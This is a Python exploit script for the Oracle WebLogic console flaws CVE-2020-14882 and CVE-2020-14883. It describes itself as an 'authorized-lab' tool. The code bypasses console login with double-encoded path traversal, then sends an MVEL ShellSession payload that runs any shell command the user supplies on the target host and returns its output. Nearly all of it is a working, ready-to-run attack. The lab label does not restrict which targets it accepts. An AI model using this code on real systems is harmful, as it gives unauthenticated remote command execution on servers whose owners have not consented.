#!/usr/bin/env python3
"""CVE-2020-14882 + CVE-2020-14883 (Oracle WebLogic console) - authorized-lab deploy.

1. Detects the console authentication-bypass path traversal by requesting
   consolejndi.portal through the double-encoded /console/css/ traversal
   prefix (single- and double-encoded variants are both tried).
2. Confirms RCE with the com.tangosol.coherence.mvel2.sh.ShellSession
   gadget: the `test_handle` value is evaluated as MVEL, running a shell
   command via ProcessBuilder and reflecting its output back in the response.
"""
import argparse
import json
import random
import string
import sys
from urllib.parse import quote

import requests

TRAVERSAL_PREFIXES = [
    "/console/css/%252e%252e%252e%252e%252fconsole/consolejndi.portal",
    "/console/css/%2e%2e%2e%2e%2fconsole/consolejndi.portal",
    "/console/console/%252e%252e%252e%252e%252fconsole/consolejndi.portal",
]


def rand_str(n=12):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def check_traversal(base, timeout):
    for prefix in TRAVERSAL_PREFIXES:
        try:
            r = requests.get(base + prefix, timeout=timeout, allow_redirects=False)
        except requests.exceptions.RequestException as exc:
            return None, "%s: %s" % (type(exc).__name__, exc)
        # Auth bypass = the console page renders (200) instead of bouncing
        # to the login form (302 / Set-Cookie login).
        if r.status_code == 200 and "login" not in r.text[:1500].lower():
            return prefix, None
    return None, "no traversal variant reached consolejndi.portal unauthenticated"


def build_rce_url(command, marker):
    mvel = ("new java.util.Scanner(new java.lang.ProcessBuilder(new "
            "java.lang.String[]{'/bin/sh','-c','echo %s; %s; echo %s'})"
            ".start().getInputStream()).useDelimiter('\\\\A').next()"
            % (marker, command, marker))
    prefix = "/console/css/%252e%252e%252e%252e%252fconsole/consolejndi.portal"
    handle = "com.tangosol.coherence.mvel2.sh.ShellSession(%s)" % quote(mvel, safe="[]{}(),.'\\-")
    return prefix + "?test_handle=" + handle


def run(args):
    base = "%s://%s:%d" % (args.scheme, args.target, args.port)
    result = {
        "cve": "CVE-2020-14882",
        "target": base,
        "vulnerable": False,
        "verified_by": None,
        "traversal": None,
        "rce": None,
        "command_output": None,
        "error": None,
    }
    prefix, err = check_traversal(base, args.timeout)
    result["traversal"] = {"bypassed": prefix is not None, "path": prefix, "error": err}
    if prefix is None:
        result["error"] = err
        return result
    result["vulnerable"] = True
    result["verified_by"] = "console authentication bypass via encoded path traversal (CVE-2020-14882)"

    marker = "wl" + rand_str(8)
    url = build_rce_url(args.command, marker)
    rce = {"url": url, "status": None, "error": None}
    try:
        r = requests.get(base + url, timeout=args.timeout)
        rce["status"] = r.status_code
        body = "\n".join([r.text] + [h.get("Location", "") for h in r.history] +
                        [r.headers.get("Location", "")])
        if marker in body:
            output = body.split(marker, 1)[1].rsplit(marker, 1)[0].strip()
            result["rce"] = rce
            result["command_output"] = output
            result["verified_by"] = "unauthenticated RCE via ShellSession MVEL gadget (CVE-2020-14883 chained)"
            return result
    except requests.exceptions.RequestException as exc:
        rce["error"] = "%s: %s" % (type(exc).__name__, exc)
    result["rce"] = rce
    return result


def main():
    p = argparse.ArgumentParser(description="CVE-2020-14882 WebLogic console authorized-lab deploy")
    p.add_argument("--target", required=True)
    p.add_argument("--port", type=int, default=7001)
    p.add_argument("--scheme", choices=["http", "https"], default="http")
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--command", default="id; hostname", help="shell command (default: id; hostname)")
    args = p.parse_args()
    try:
        result = run(args)
    except Exception as exc:
        result = {"cve": "CVE-2020-14882", "target": "%s:%d" % (args.target, args.port),
                  "vulnerable": False, "error": "%s: %s" % (type(exc).__name__, exc)}
    print(json.dumps(result, indent=2))
    return 0 if result.get("vulnerable") else 1


if __name__ == "__main__":
    sys.exit(main())
